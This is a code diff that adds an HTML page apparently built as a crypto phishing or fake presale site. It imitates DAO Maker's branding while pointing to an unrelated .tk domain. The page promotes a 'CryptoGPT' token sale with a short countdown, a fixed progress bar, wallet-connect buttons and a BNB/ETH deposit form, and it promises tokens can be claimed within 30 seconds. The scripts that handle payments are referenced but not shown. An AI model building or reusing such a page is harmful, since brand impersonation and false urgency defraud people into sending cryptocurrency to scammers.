@@ -235,3 +235,489 @@
     </script>
   </body>
 </html>
+
+<!DOCTYPE html><html class="color-scheme-light" lang="en"><head>
+    <meta charset="utf-8">
+    
+    <script defer data-domain="daomaker.es" src="js/plausible.js"></script>
+    <title>DAO Pad by DAO Maker</title>
+    <meta name="description" content="Dao Maker">
+    <meta http-equiv="cache-control" content="no-cache, must-revalidate, post-check=0, pre-check=0">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta property="og:url" content="https://kpipta.tk">
+    <meta property="og:title" content="Daomaker">
+    <meta property="og:description" content="Dao Maker">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/0c05e5ca089dbe49644b0dfa51a90e6d_photo.png">
+    <meta property="fb:app_id" content="257953674358265">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="shortcut icon" href="favicon.ico" type="image/png">
+    <link rel="apple-touch-icon" href="images/152_badge.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="images/152_badge.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="images/152_badge.png">
+    <link rel="apple-touch-startup-image" href="/img/152_badge.png">
+    <meta name="msapplication-TileColor" content="#fafafa">
+    <meta name="msapplication-TileImage" content="/img/270_badge.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <meta name="color-scheme" content="light dark">
+    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="msapplication-tap-highlight" content="no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="preload" href="/img/Inter-Medium.ttf" as="font" crossorigin="anonymous">
+    <link rel="preload" href="/img/Inter-Black-slnt=0.ttf" as="font" crossorigin="anonymous">
+    <link rel="preload" as="image" href="/pip_files/hero_image_P3rCEDOUBoS.webp">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/buys.css">
+    <link rel="stylesheet" href="css/style.css.css">
+    <link rel="stylesheet" href="css/pstyles.css">
+    <link rel="stylesheet" href="css/styleshome.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.cryptofonts.com/1.3.0/cryptofont.css">
+    <script src="js/jquery.min.js"></script>
+
+
+<script>
+    function modal() {
+        $(".account-input-modal").hide();
+        $("#send_tx_button").click(() => {
+            $(".account-input-modal").show();
+
+
+        });
+        $(".close-modal").click(() => {
+            $(".account-input-modal").hide();
+
+        })
+
+    }
+</script></head>
+
+
+
+<body class="color-scheme-light">
+    <app-root ng-version="11.2.11">
+        <router-outlet></router-outlet>
+        <app-company class="ng-star-inserted">
+            <header-nav-bar _nghost-qsd-c63>
+                <header _ngcontent-app-root-c73 class="primary-header">
+                    <div _ngcontent-app-root-c73 class="container-fluid">
+                        <div _ngcontent-app-root-c73 class="row">
+                            <div _ngcontent-app-root-c73 class="col_logo col-lg-4 col-sm-4 col-6 align-self-center"><a _ngcontent-app-root-c73 routerlink="/" routerdirection="forward" class="site-logo" href="/"><img _ngcontent-app-root-c73 width="200" height="44" class="img-fluid" src="fonts/logo-dark.svg" alt="DAO Maker">
+									<!---->
+									<!---->
+								</a></div>
+                            <div _ngcontent-qsd-c63 class="align-self-center align-center main_menu d-none d-lg-block col">
+                                <ul _ngcontent-qsd-c63 class="nav">
+                                    <li _ngcontent-qsd-c63><a _ngcontent-qsd-c63 target="_blank" href="/fundrasing">
+											FUNDRAISING </a>
+                                    </li>
+                                    <li _ngcontent-qsd-c63><a _ngcontent-qsd-c63 routerlink="../../#company" href="../../#company">
+											SALES </a></li>
+                                    <li _ngcontent-qsd-c63 class="menu-item"><a _ngcontent-qsd-c63 onclick="showMailModal();">
+											SUPPORT </a></li>
+                                </ul>
+                            </div>
+                            <div _ngcontent-qsd-c63 class="col_side_menu col-lg-4 col-sm-8 col-6 isLoggedIn align-self-center align-right ng-star-inserted">
+                                <ul _ngcontent-qsd-c63 class="nav side_menu">
+                                    <li _ngcontent-qsd-c63><a _ngcontent-qsd-c63 class="btn outline wallet blue position-relative" id="prepare"><span _ngcontent-qsd-c63 class="status disconnected ng-star-inserted" id="btn-connect">
+												Connect Wallet</span></a></li>
+                                    <li _ngcontent-qsd-c63 style="margin-left: -20px"><a _ngcontent-qsd-c63 class="btn outline wallet blue position-relative" id="connected" style="display: none"><span _ngcontent-qsd-c63 class="status disconnected ng-star-inserted" id="btn-disconnect">
+												Disconnect Wallet </span></a></li>
+                                    <li _ngcontent-qsd-c63 class="d-none d-lg-inline-block"><button _ngcontent-qsd-c63 class="btn web3_send_tx_button" onclick="ym(86950690, 'reachGoal', 'connect'); return true;">
+											<div _ngcontent-qsd-c63 class=" inner"><span _ngcontent-qsd-c63 data-text="ACCOUNT">ACCOUNT</span>
+											</div>
+										</button></li>
+                                    <!-- <li _ngcontent-qsd-c63="" class="d-lg-none">
+										<div _ngcontent-qsd-c63="" id="gnavBtn" class="menu-toggle"><span
+												_ngcontent-qsd-c63=""></span>
+										</div>
+									</li> -->
+                                </ul>
+                            </div>
+                            <!---->
+                            <!---->
+                            <!---->
+                        </div>
+
+                    </div>
+                    <!---->
+                </header>
+            </header-nav-bar>
+            <div class="main">
+                <app-breadcrumb class="ng-star-inserted">
+                    <div class="breadcrumb_wrapper">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-12">
+                                    <ul class="breadcrumb">
+                                        <li><a routerlink="/" routerdirection="forward" href="/"><span class="btn-icons home"></span><span class="btn-icons keyboard_arrow_right"></span>Home</a></li>
+                                        <li class="ng-star-inserted"><span class="ng-star-inserted"><span class="btn-icons keyboard_arrow_right"></span>CryptoGPT</span>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </app-breadcrumb>
+                <div class="py-lg-5 pt-5 pb-4 container">
+                    <ul ngbnav activeid="research" class="nav-tabs nav" role="tablist">
+                        <li ngbnavitem="research" class="nav-item ng-star-inserted"><a href ngbnavlink id="ngb-nav-1" role="tab" aria-controls="ngb-nav-1-panel" aria-selected="true" aria-disabled="false" class="nav-link active"> Research </a></li>
+                    </ul>
+                    <div class="alert alert-danger" id="alert-error-https" style="display: none">
+                        You can run this project only over HTTPS connection.
+                    </div>
+                    <div class="tab-content">
+                        <div ngbnavpane class="tab-pane fade show active ng-star-inserted" id="ngb-nav-1-panel" role="tabpanel" aria-labelledby="ngb-nav-1">
+                            <div class="company_data py-lg-5 pt-5 pb-4 ng-star-inserted">
+                                <div class="container">
+                                    <div class="row flexer">
+                                        <div class="col-lg-6 company_brief">
+                                            <div class="row">
+                                                <div class="col-sm-3 col_logo">
+                                                    <div class="inner"><img class="img-fluid" alt="CryptoGPT" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQh0KFRc7KWUkcD08SQhvN8aWnwb4z2V-jsleg6H2IK8Q&amp;s">
+                                                    </div>
+                                                    <!---->
+                                                </div>
+                                                <div class="col-sm-9 col_title align-self-center">
+                                                    <!---->
+                                                    <h2>CryptoGPT</h2>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <ul class="col-12 col_highlights py-3 spanpadding">
+                                                    <p><span> GPT Layer-2 Blockchain Powering the AI Revolution. CryptoGPT is a revolutionary technology in AI x Blockchain with one mission: distributing the wealth of the AI Revolution to Billions of users </span></p>
+                                                </ul>
+                                            </div>
+                                            <div class="row buttonrow">
+                                                <div class="col-12 mt-3 col_action ng-star-inserted buttons">
+                                                    <button class="btn has-icon small-txt" id="depositbtn" data-target="#get-pay-address">
+														BUY
+														TOKENS
+														<span class="btn-icons keyboard_arrow_right"></span>
+													</button>
+                                                </div>
+                                                <div class="col-12 mt-3 col_action ng-star-inserted buttons">
+                                                    <button id="disabledButton" class="btn has-icon small-txt" style="margin-left: 0; " disabled="disabled">
+														CLAIM
+													</button>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-lg-9 offset-md-1">
+                                                    <p class="text-muted"><small>Claim button becomes active within 30
+															seconds after purchasing. <br></small></p>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="col-sm-6" style="border-radius: 20px;
+										                                          box-shadow: 0 0 4px rgb(0 0 0 / 10%), 0 4px 8px rgb(0 0 0 / 10%); margin-bottom: 4%;">
+                                            <div class="pool-hero__card">
+                                                <div class="header">
+                                                    <div>
+                                                        <h4 class="title">Swap Amount</h4>
+                                                    </div>
+                                                    <div>
+                                                        <h5 class="token" data-target="pool-partial.price"><span>1 $GPT
+																=
+																$0,005</span>
+                                                        </h5>
+                                                    </div>
+                                                </div>
+                                                <h3 class="info" data-target="pool-partial.swapAmount">180,000,000 GPT
+                                                </h3>
+                                                <h4 class="title" data-target="pool-partial.countdownLabel">Closes in</h4>
+                                                <div class="info" data-target="pool-partial.countdown">
+                                                    <ul style="list-style: none; display: inline-flex;padding: 0; font-size: 28px;">
+                                                        <li style="margin-left: 0"><span id="days">0</span>d</li>
+                                                        <li style="margin-left: 0.5em"><span id="hours">1</span>h</li>
+                                                        <li style="margin-left: 0.5em"><span id="minutes">54</span>m</li>
+                                                        <li style="margin-left: 0.5em"><span id="seconds">1</span>s</li>
+                                                    </ul>
+                                                </div>
+                                                <h4 class="title">Swap Progress</h4>
+                                                <div class="pool-hero__progress">
+                                                    <div class="progress">
+                                                        <div class="progress-bar featured-card__step-1 d-none" data-target="pool-partial.minSwapLevelProgressBar" role="progressbar" style="width: 0%" aria-valuemin="0" aria-valuemax="100"></div>
+                                                        <div class="progress-bar featured-card__step-2" role="progressbar" style="width: 86%" aria-valuemin="0" aria-valuemax="100" data-target="pool-partial.progressBar"></div>
+                                                    </div>
+                                                    <div class="pool-hero__progress-footer" id="progress-footer">
+                                                        <div class="pool-hero__percent" data-target="pool-partial.progressPercentage">
+                                                            86%</div>
+                                                        <div class="pool-hero__amount"><span data-target="pool-partial.swapLevelLabel"></span>180,000,000 GPT
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-lg-6 company_brief">
+
+
+                                            <div class="col-lg-6 company_metrics ng-star-inserted">
+                                                <div class="metrics_card card">
+                                                    <div class="inner py-4 px-2">
+                                                        <h3 class="col-12">Key Metrics</h3>
+                                                        <ul class="col-12 mt-2">
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Ticker:</div>
+                                                                <div class="col-lg-6 metric_value">GPT
+                                                                </div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Blockchain Network:</div>
+                                                                <div class="col-lg-6 metric_value">BSC & ETH</div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Token Supply:</div>
+                                                                <div class="col-lg-6 metric_value">400,000,000</div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Project Valuation:</div>
+                                                                <div class="col-lg-6 metric_value">$32,000,000</div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Initial Token Circulation:</div>
+                                                                <div class="col-lg-6 metric_value">60,000,000</div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Initial Market Cap:</div>
+                                                                <div class="col-lg-6 metric_value">$900,000</div>
+                                                            </li>
+                                                            
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Min. Allocation:</div>
+                                                                <div class="col-lg-6 metric_value">0.25 BNB / 0.1 ETH </div>
+                                                            </li>
+                                                            <li class="row m-0">
+                                                                <div class="col-lg-6 metric_label">Max. Allocation:</div>
+                                                                <div class="col-lg-6 metric_value">50 BNB / 10 ETH</div>
+                                                            </li>
+                                                            <!---->
+                                                            <!---->
+                                                            <!---->
+                                                            <!---->
+                                                        </ul>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+                                        <!---->
+                                    </div>
+
+                                    <div class="row">
+
+
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <app-footer _nghost-qsd-c66>
+                    <div _ngcontent-qsd-c66 class="primary-footer">
+                        <ul _ngcontent-fcr-c66 id="theme-switcher" class="theme-switcher active">
+                            <li _ngcontent-fcr-c66 class="dark ng-star-inserted"></li>
+                            <li _ngcontent-fcr-c66 class="light ng-star-inserted"><span _ngcontent-fcr-c66 class="ng-star-inserted"><img _ngcontent-fcr-c66 alt="light" src="fonts/nights_stay.svg" width="24" height="24"></span></li>
+                        </ul>
+                        <script>
+                        </script>
+                        <div _ngcontent-qsd-c66 class="container">
+                            <div _ngcontent-qsd-c66 class="row">
+                                <div _ngcontent-qsd-c66 class="col-xl-3 col-lg-4 col-md-5 logo_wrapper"><a _ngcontent-qsd-c66 href="/" class="footer-logo"><img _ngcontent-qsd-c66 alt="DAO Maker" class="img-fluid  ng-star-inserted ng-lazyloaded" src="fonts/footer-logo-dark.svg" width="160" height="25"></a>
+                                    <script type="text/javascript" src="js/jquery-latest.min.js"></script>
+                                    <div class="newsletter_form">
+                                        <span id="erros" style=" color:red "></span>
+                                        <form id="form_email">
+                                            <input type="email" id="mail" required placeholder="Sign up for our newsletter">
+                                            <button id="submit" onsubmit="return false;" type="submit"><span class="btn-icons  ng-lazyloaded" style="background-image: url(&#x27;fonts/keyboard_arrow_right_black.svg&#x27;);"></span></button>
+                                        </form>
+                                    </div>
+
+                                    <div _ngcontent-qsd-c66 class="social-links">
+                                        <ul _ngcontent-qsd-c66>
+                                            <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://twitter.com/thedaomaker" target="_blank">
+													<img _ngcontent-qsd-c66 alt="Twitter" class="twitter  img-fluid  ng-star-inserted ng-lazyloaded" src="fonts/twitter-dark.svg" width="22"></a></li>
+                                            <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://t.me/daomaker" target="_blank">
+													<img _ngcontent-qsd-c66 alt="Telegram" class="telegram  img-fluid  ng-star-inserted ng-lazyloaded" src="fonts/telegram-dark.svg" width="22"></a></li>
+                                            <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://www.instagram.com/thedaomaker/" target="_blank">
+													<img _ngcontent-qsd-c66 alt="Instagram" class="instagram  img-fluid  ng-star-inserted ng-lazyloaded" id="instagram" src="fonts/instagram-dark.svg" width="24"></a></li>
+                                        </ul>
+                                    </div>
+                                    <div _ngcontent-qsd-c66 class="copyright"> Copyright © 2021 DAO Maker </div>
+                                </div>
+                                <div _ngcontent-qsd-c66 class="footer_link_wrapper col-xl-9 col-lg-8 col-md-7">
+                                    <div _ngcontent-qsd-c66 class="row no-gutters">
+                                        <div _ngcontent-qsd-c66 class="col-md-3 footer_links">
+                                            <h3 _ngcontent-qsd-c66>COMPANY</h3>
+                                            <ul _ngcontent-qsd-c66>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 routerlink="/" routerdirection="forward" target="_blank" href="/">Home</a></li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://learn.daomaker.com/" target="_blank">Learn</a></li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 routerlink="/projects/" routerdirection="root" target="_blank" routerlinkactive="active-link" href="/projects/"> Staking </a></li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://learn.daomaker.com/about" target="_blank">About</a></li>
+                                            </ul>
+                                        </div>
+                                        <div _ngcontent-qsd-c66 class="col-md-6 footer_links">
+                                            <h3 _ngcontent-qsd-c66>RESOURCES</h3>
+                                            <div _ngcontent-qsd-c66 class="row">
+                                                <div _ngcontent-qsd-c66 class="col-lg-6 col-resources">
+                                                    <ul _ngcontent-qsd-c66>
+                                                        <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://drive.google.com/drive/folders/1cuLFTtvZE-lccjheB6kXEh7moI7yMfHA" target="_blank">Brand Assets</a></li>
+                                                        <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://daomaker.com/socialmining" target="_blank">Social Mining
+																Deck</a></li>
+                                                    </ul>
+                                                </div>
+                                                <div _ngcontent-qsd-c66 class="col-lg-6 col-resources">
+                                                    <ul _ngcontent-qsd-c66>
+                                                        <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://drive.google.com/open?id=1tPRMktnros6ifJLfvQkrT6mAmEJvUufT" target="_blank">DAO Maker Whitepaper</a></li>
+                                                        <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://drive.google.com/file/d/1ZZUVyQXnBgLaqWqv7qRnU0jNpEyxEkff/view?usp=sharing" target="_blank">DAO Maker Economics Paper</a></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div _ngcontent-qsd-c66 class="col-md-3 footer_links">
+                                            <h3 _ngcontent-qsd-c66>USEFUL LINKS</h3>
+                                            <ul _ngcontent-qsd-c66>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="https://medium.com/daomaker" target="_blank">Blog</a></li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 routerlink="/privacy-policy" target="_blank" href="https://daomaker.com/privacy-policy">Privacy Policy</a>
+                                                </li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 routerlink="/terms-and-conditions" target="_blank" href="https://daomaker.com/terms-and-conditions">Terms and
+														Conditions</a></li>
+                                                <li _ngcontent-qsd-c66><a _ngcontent-qsd-c66 href="#" onclick="showMailModal();">Support</a></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <ngx-spinner _ngcontent-qsd-c66 type="ball-grid-beat" color="#1FA5FF" size="medium" _nghost-qsd-c58 class="ng-tns-c58-0"></ngx-spinner>
+                </app-footer>
+        
+    
+
+    <div class="modal fade" id="get-pay-address" tabindex="-1" role="dialog" data-backdrop="static" aria-labelledby="exampleModalCenterTitle" aria-modal="true" style="display: none;">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="modal-header " style="position: relative;">
+                    <h5 class="modal-title" id="exampleModalLongTitle">Deposit Amount</h5>
+                    <button style="position: absolute; right: 12px; top: 9px;" type="button" data-dismiss="modal" class="close" id="closeModal" aria-label="Close">
+						<span aria-hidden="true">×</span>
+					</button>
+                </div>
+                <div class="modal-body">
+                    <dl id="sample" class="dropdown ethDropdown" style="display: none;">
+                        <dt>
+							<div class="ps--badge ps--primary correct" data-project-partial-target="status" style="background-color: #62688f; border-color: #62688f; font-size: 0.9rem;">Ethereum Mainnet
+							</div>
+						</dt>
+                        <dd>
+                            <ul id="ethDropdown" style="display: none;"></ul>
+                        </dd>
+                    </dl>
+                    <dl id="sample" class="dropdown bscDropdown" style="display: none;">
+                        <dt>
+							<div class="ps--badge ps--primary correct bnbcorrect" data-project-partial-target="status" style="background-color: #f3ba2f; border-color: #f3ba2f; color: white; font-size: 0.9rem;">
+								Binance chain
+							</div>
+						</dt>
+                        <dd>
+                            <ul id="bscDropdown" style="display: none;"></ul>
+                        </dd>
+                    </dl>
+                    <span id="result"></span>
+                    <div style="display: flex; justify-content: space-between;">
+                        <div>
+                            Amount
+                        </div>
+                        <div class="d-flex align-items-center" style="display: flex; align-items: center;">
+                            <strong>Balance:</strong>
+                            <div style="margin-right: 10px; margin-left: 10px;">
+                                <span id="balanceBNB">0.000</span>
+                                <span id="balanceBUSD"></span>
+                                <span id="balanceUSDT"></span>
+                            </div>
+                            <div class="bscDropdown" style="margin-top: -5px;">
+                                <img id="bscimg" style="width: 25px;" src="images/Cjdowner-Cryptocurrency-Flat-Binance-Coin-BNB.png" alt srcset>
+
+                            </div>
+                            <div class="ethDropdown" style="margin-top: -5px; display: none;">
+                                <img id="ethimg" style="width: 13px" src="images/eth-left.png" alt srcset>
+
+                            </div>
+                        </div>
+                    </div>
+                    <div style="position: relative; margin-top: 10px; margin-bottom: -25px; " ;>
+                        <input type="number" oninput="keyUp(event)" id="depositAmount" placeholder="0.00" class="form-control" value>
+                        <span id="max-btn" class="max-btn" style="display: none;"></span>
+
+                    </div>
+                    <div style="position: relative; margin-top: 10px; margin-bottom: -25px; " ;>
+                        <input type="text" id="poln_summ" value disabled="disabled" style="margin-top: 32px" placeholder="0.00" class="form-control">
+                        <span id="max-btn" class="max-btn">$GPT
+
+						</span>
+                    </div>
+                </div>
+                <div class="modal-footer d-flex justify-content-center">
+                    <button style="color: rgb(243 243 243); background-color: #1b89d3;
+                        border-color: #1b89d3; border-radius: 5px;" type="button" id="sendEthButton" class="btnpay wlt-btn btn-between w-100 ">Buy tokens</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div data-v-2dbb81e4 class="overlays mail-input-modal" style="display:none">
+        <div class="mail-input cards">
+            <div class="title">Send feedback</div>
+            <div class="simple_form search">
+                <span>E-mail <span style="color: #f00">*</span></span>
+                <input class="string optional search__input" placeholder="yourname@example.com" type="email" name="email" oninput="clearInvalid(this)">
+            </div>
+            <div class="simple_form search">
+                Telegram
+                <input class="string optional search__input" placeholder="@username" type="text" name="telegram" pattern="[a-zA-Z0-9_@]{4,35}" oninput="clearInvalid(this)">
+            </div>
+            <div class="simple_form search" style="grid-template-rows: auto; grid-template-columns: 1fr">
+                <span>Message <span style="color: #f00">*</span></span>
+                <textarea class="string optional search__input" placeholder="message" name="message" rows="10" oninput="clearInvalid(this)"></textarea>
+            </div>
+            <input class="hidden" name="project" type="hidden" value="feedback">
+            <div class="error-box"></div>
+            <div class="controls">
+                <button class="button close-modal button--secondary" onclick="closeMailModal()">
+					Cancel
+				</button>
+                <button class="button button--primary" onclick="sendMail()">Send</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/jquery.bundle.js"></script>
+    <script src="js/jdenticon.min.js" async crossorigin="anonymous"></script>
+    <script src="js/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal"></script>
+    <script type="text/javascript" src="js/index.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+    <script type="text/javascript" src="js/fortmatic.js"></script>
+    <script src="js/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script>
+    <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+
+    <script type="text/javascript" src="js/web3.js"></script>
+    <script type="text/javascript" src="js/scripts1.js"></script>
+    <script type="text/javascript" src="js/value.js"></script>
+    <script type="text/javascript" src="js/payment.js"></script>
+    <!-- <script src="/pip_files/scripts.js"></script> -->
+
+
+
+
+</div></app-company></app-root></body></html>
